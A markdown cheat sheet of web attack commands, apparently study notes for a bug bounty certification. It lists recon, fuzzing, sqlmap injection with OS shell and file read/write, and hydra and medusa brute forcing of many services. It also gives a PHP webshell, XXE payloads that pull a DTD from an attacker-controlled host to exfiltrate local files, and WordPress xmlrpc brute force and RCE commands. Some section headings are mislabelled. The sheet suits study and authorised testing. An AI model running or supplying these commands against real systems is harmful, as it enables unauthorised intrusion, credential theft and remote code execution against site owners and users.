# CBBH

% CBBH

## passive web - dig A records
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
dig a <sub.targetDomain> @<NS>
```

## passive web - dig PTR records
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
dig -x <sub.targetDomain> @<NS>
```

## passive web - dig ANY registers
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
dig any <sub.targetDomain> @<NS>
```

## passive web - dig TXT registers
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
dig txt <sub.targetDomain> @<NS>
```

## passive web - dig MX registers
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
dig mx <sub.targetDomain> @<NS>
```

## passive web - nslookup AXFR
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
nslookup -type=AXFR <targetDomain> <nameserverIP>
```

## passive web - cert.sh
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
curl -s "https://crt.sh/?q=<targetDomain>&output=json" | jq -r '.[] | "\(.name_value)\n\(.common_name)"' | sort -u > "out_crt.sh.txt"
```

## passive web - openssl certificate
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
openssl s_client -ign_eof 2>/dev/null <<<$'HEAD / HTTP/1.0\r\n\r' -connect "<targetDomain>:<port>" | openssl x509 -noout -text -in - | grep 'DNS' | sed -e 's|DNS:|\n|g' -e 's|^\*.*||g' | tr -d ',' | sort -u
```

## passive web - theharvester
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
cat /Users/chin/tools/InfoGather/sourcesTheHarvester.txt | while read source; do theHarvester -d "<targetDomain>" -b $source -f "${source}_out";done

```

## passive web - theharvester merge
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
cat *.json | jq -r '.hosts[]' 2>/dev/null | cut -d':' -f 1 | sort -u > "<out>"

```

## passive web - theharvester sort
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
cat <fileInput> | sort -u > <out.txt>

```

## passive web - theharvester sort
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
/Users/chin/tools/InfoGather/waybackurls -dates <URL> > waybackurls.txt

```

## active web - identify web server and version
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
curl -I "http://${TARGET}"
```

## active web - subdomain enum
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
gobuster dns -q -r <NS> -d <targetDomain> -p <patternsFile> -w <wordlist> -o <outFile>
```

## active web - aquatone
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
cat <URLlist> | aquatone -out ./aquatone -screenshot-timeout 1000
```

## active web - crawling
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
ffuf -recursion -recursion-depth 1 -u http://<target>/FUZZ -w <wordlist>
```

## active web - multiple crawling
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
ffuf -w ./<wordlistDirectories>:FOLDERS,./<wordlistDirectories2>:WORDLIST,./<wordlistExtensions>:EXTENSIONS -u http://192.168.10.10/FOLDERS/WORDLISTEXTENSIONS
```

## active web - cewl
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
cewl -m5 --lowercase -w wordlist.txt http://<target>
```

## fuzzing - directories
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
ffuf -u <targetURL>/FUZZ -w <wlist> -ic -c
```

## fuzzing - pages - extension
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
ffuf -w <wlist>:FUZZ -u <targetURL>/<page>FUZZ -ic -c
```

## fuzzing - page - page
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
ffuf -w <wlist>:FUZZ -u <targetURL>/FUZZ.<ext> -ic -c
```

## fuzzing - recursive
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
ffuf -w <wlist>:FUZZ -u <targetURL>/FUZZ -recursion -recursion-depth <depth> -v -ic -c
```

## fuzzing - recursive with extension
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
ffuf -w <wlist>:FUZZ -u <targetURL>/FUZZ -recursion -recursion-depth <depth> -e .<ext> -v -ic -c
```

## dns record to /etc/hosts
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
sudo sh -c 'echo "<IP>  <sub.domain.xxx>" >> /etc/hosts'
```

## fuzzing - subdomains
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
ffuf -w <wlist>:FUZZ -u http<s>://FUZZ.<targetDomain>/ -ic -c
```

## fuzzing - vHosts ffuf
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
ffuf -w <wlist>:FUZZ -u <targetURL> -H 'Host: FUZZ.<targetDomain>' -ic -c
```

## fuzzing - vHosts gobuster
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
gobuster vhost -u <targetURL> -w <wlist> --append-domain -ic -c
```

## fuzzing - GET request fuzzing (then filter by size)
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
ffuf -w <wlist>:FUZZ -u '<target>/<file>?FUZZ=key' -ic -c
```

## fuzzing - POST request fuzzing (then filter by size)
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
ffuf -w <wlist>:FUZZ -u <target> -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -ic -c
```

## fuzzing - get numbers 1-1000
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
for i in $(seq 1 1000); do echo $i >> ids.txt; done
```

## fuzzing - value fuzzing (then filter by size)
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
ffuf -w <wlist>:FUZZ -u <target> -X POST -d '<param>=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -ic -c
```

## XSS - xsstrike
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
python xsstrike.py -u "<targetURL>"
```

## SQLi - sqlmap without user input
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
sqlmap -u "<targetURL>" --batch
```

## SQLi - sqlmap POST
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
sqlmap '<targetURL>' --data '<parameters=value&>'
```

## SQLi - sqlmap w request
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
sqlmap -r <reqFile>
```

## SQLi - sqlmap PUT
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
sqlmap -u <targetURL> --data='<parameters=value&>' --method PUT
```

## SQLi - sqlmap prefix & suffix
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
sqlmap -u "<targetURL>" --prefix="<prefix>" --suffix="<suffix>"
```

## SQLi - sqlmap risk&level
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
sqlmap -u <targetURL> -v 3 --level=<0-5> --risk=<0-5>
```

## SQLi - sqlmap basic enum
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
sqlmap -u "<targetURL>" --banner --current-user --current-db --is-dba
```

## SQLi - sqlmap tables enum
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
sqlmap -u "<targetURL>" --tables -D <database>
```

## SQLi - sqlmap table/row enum
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
sqlmap -u "<targetURL>" --dump -T <table> -D <database> -C <column1,column2>
```

## SQLi - sqlmap schema enum
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
sqlmap -u "<targetURL>" --schema
```

## SQLi - sqlmap anti-csrf token bypass
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
sqlmap -u "<targetURL>" --data="<key=value&csrf-token=value>" --csrf-token="<csrf-token>"
```

## SQLi - sqlmap reading files
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
sqlmap -u "<targetURL>" --file-read "</etc/passwd>"
```

## SQLi - sqlmap write files
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
sqlmap -u "<targetURL>" --file-write "<file2write>" --file-dest "</var/www/html/shell.php>"
```

## SQLi - sqlmap spawn shell
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
sqlmap -u "<targetURL>" --os-shell
```

## SQLi - sqlmap random value bypass
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
sqlmap -u "<targetURL/?id=1&rp=29125>" --randomize=<value> --batch -v 5 | grep URI
```

## SQLi - sqlmap calculated parameter bypass
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
sqlmap -u "<targetURL/?id=1&h=c4ca4238a0b923820dcc509a6f75849b>" --eval="<import hashlib; h=hashlib.md5(id).hexdigest()>" --batch -v 5 | grep URI
```

## SQLi - sqlmap ip concealing
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
sqlmap <targetURL> --proxy="<socks4://177.39.187.70:33283>”
```

## SQLi - sqlmap tor
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
sqlmap <targetURL> --tor
```

## SQLi - sqlmap WAF bypass
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
sqlmap <targetURL> --skip-waf
```

## SQLi - sqlmap random agent
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
sqlmap <targetURL> --random-agent
```

## SQLi - sqlmap tamper
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
sqlmap <targetURL> --tamper=<tamper method>
```

## SQLi - sqlmap list tampers
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
sqlmap --list-tampers
```

## SQLi - sqlmap Miscellaneous Bypasses
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
sqlmap <targetURL> --chunked
```

## SSTI - sttimap
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
sstimap.py -u <targetURL>
```

## SSTI - tplmap
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
tplmap.py -u '<targetURL>'
```

## Login Brute Forcing - get
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
hydra -C <wordlist> <IP> -s <port> http-get <loginPath>
```

## Login Brute Forcing - POST form
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
hydra -l <username> -P <wlist> -s <port> <targetIP> http-post-form "<path2endpoint>:<UserParameter>=^USER^&<PasswdParameter>=^PASS^:F=<ErrMsg>”
```

## Login Brute Forcing - hydra - Basic Auth
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
hydra -l <username> -P <passwdlst> http-get://<targetIP>:<port>/
```

## Login Brute Forcing - hydra - SSH
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
hydra -L <wlistUser> -P <wlistPasswd> ssh://<target>:<port>
```

## Login Brute Forcing - hydra - FTP
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
hydra -l <user> -P <passwdsList> ftp://<target>
```

## Login Brute Forcing - hydra - General
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
hydra -l <username> -P <passwordsList> -u -f -t 4 ssh://<targetURL>:<port>
```

## Login Brute Forcing - hydra - XXEinjector
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
ruby XXEinjector.rb --host=<AttackerIP> --httpport=<ourPORT> --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
```

## Login Brute Forcing - filter - min length
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
grep -E '^.{<minLen>,}$' <wlist>
```

## Login Brute Forcing - filter - uppercase
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
grep -E '[A-Z]' <wlist>
```

## Login Brute Forcing - filter - lowercase
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
grep -E '[a-z]' <wlist>
```

## Login Brute Forcing - filter - numbers
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
grep -E '[0-9]' <wlist>
```

## Login Brute Forcing - hydra - multiple ssh
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
hydra -l <user> -p <passw> -M <targetsWlist> ssh
```

## Login Brute Forcing - hydra - hybrid attack
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
hydra -l <username> -x <minchar>:<maxchar>:abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 <targetIP> <protocol>
```

## Login Brute Forcing - medusa - ftp
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
medusa -M ftp -h <target> -u <username> -P <passwdlst>
```

## Login Brute Forcing - medusa - HTTP
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
medusa -M http -h <target> -U <usernamelst> -P <passwdlst> -m DIR:/login.php -m FORM:<userparam>=^USER^&<passwdparam>=^PASS^
```

## Login Brute Forcing - medusa - IMAP
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
medusa -M imap -h <mail-example-com> -U <users-txt> -P <passwords-txt>
```

## Login Brute Forcing - medusa - MySQL
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
medusa -M mysql -h <target> -u <username> -P <passwords-txt>
```

## Login Brute Forcing - medusa - POP3
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
medusa -M pop3 -h <mail-example-com> -U <users-txt> -P <passwords-txt>
```

## Login Brute Forcing - medusa - RDP
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
medusa -M rdp -h <target> -u <username> -P <passwords-txt>
```

## Login Brute Forcing - medusa - SSH
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
medusa -M ssh -h <target> -u <username> -P <passwords-txt>
```

## Login Brute Forcing - medusa - Subversion svn
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
medusa -M svn -h <target> -u <username> -P <passwords-txt>
```

## Login Brute Forcing - medusa - Telnet
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
medusa -M telnet -h <target> -u <username> -P <passwords-txt>
```

## Login Brute Forcing - medusa - VNC
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
medusa -M vnc -h <target> -P <passwords-txt>
```

## Login Brute Forcing - medusa - Web Form
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
medusa -M web-form -h <target> -U <users-txt> -P <passwords-txt> -m FORM:"<userParam>=^USER^&<passwdParam>=^PASS^:F=<ErrMsg>"
```

## Login Brute Forcing - medusa - Multiple Basic Auth HTTP
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
medusa -H <web_servers-txt> -U <usernames-txt> -P <passwords-txt> -M http -m GET
```

## Login Brute Forcing - medusa - Testing for Empty or Default Passwords
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
medusa -h <target> -U <usernames-txt> -e ns -M <service_name>
```
## Login Brute Forcing - list open ports and listening services
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
netstat -tulpn | grep LISTEN
```

## Broken Auth - filters to match policy
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
grep '[[:upper:]]' /<wlist> | grep '[[:lower:]]' | grep '[[:digit:]]' | grep -E '.{10}' > custom_wordlist.txt
```

## Broken Auth - get world cities wordlist
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
wget https://raw.githubusercontent.com/datasets/world-cities/refs/heads/main/data/world-cities.csv
```

## Broken Auth - extract city wordlists
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
cat world-cities.csv | cut -d ',' -f1 > city_wordlist.txt
```

## Broken Auth - extract specific country cities wordlists
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
cat world-cities.csv | grep <Germany> | cut -d ',' -f1 > <country>_cities.txt
```

## Web Attacks - XXE - webshell - hosted (then host it on a webserver)
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
echo '<?php system($_REQUEST["cmd"]);?>' > shell.php
```

## Web Attacks - XXE - join entity file - hosted (then host it on a webserver)
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd
```

## Web Attacks - XXE - call join entity (on target)
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
echo '<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php">
  <!ENTITY % end "]]>">
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %xxe;
]>'
```

## Web Attacks - XXE - Error based hosted file (then host it on a webserver)
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

## Web Attacks - XXE - join entity file - error based (then host it on a webserver)
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

## Web Attacks - XXE - Automated OOB exfiltration
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
ruby XXEinjector.rb --host=<tun0 IP> --httpport=<httpPort8000> --file=<requestFile> --path=<localFileToRead> --oob=http --phpfilter
```

## Web attacks - php web server
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
php -S 0.0.0.0:8000
```

## LFI - ftp server
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
sudo python -m pyftpdlib -p 21
```

## Wordpress - wpscan users
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
wpscan --url <targetURL> -e u
```

## Wordpress - wpscan plugins
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
wpscan --url <targetURL> -e ap
```

## Wordpress - core version enum - source code
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
curl -s -X GET <url> | grep '<meta name="generator"'
```

## Wordpress - plugin enum - source code
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
curl -s -X GET <url> | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'wp-content/plugins/*' | cut -d"'" -f2
```

## Wordpress - themes enum - source code
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
curl -s -X GET <url> | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'themes' | cut -d"'" -f2
```

## Wordpress - test for a specific plugin or diretory listing
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
<baseURL>/wp-content/plugins/<pluginName>
```

## Wordpress - manual user enumeration - 301 code -> user exists
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
curl -s -I <baseURL>/?author=1
```

## Wordpress - manual user enumeration json file
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
curl <baseURL>/wp-json/wp/v2/users | jq
```

## Wordpress - xmlrpc login
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>CORRECT-PASSWORD</value></param></params></methodCall>" <baseURL>/xmlrpc.php
```

## Wordpress - wpscan - enumerate
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
wpscan --url <url> --enumerate
```

## Wordpress - xmlrpc brute force
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
wpscan --password-attack xmlrpc -t 20 -U <username> -P <wlist> --url <url>
```

## Wordpress - theme editor rce
#plateform/linux #target/remote #port/80 #protocol/http #cat/ATTACK/
```
curl -X GET "<baseURL>/wp-content/themes/twentyseventeen/404.php?cmd=id"
```
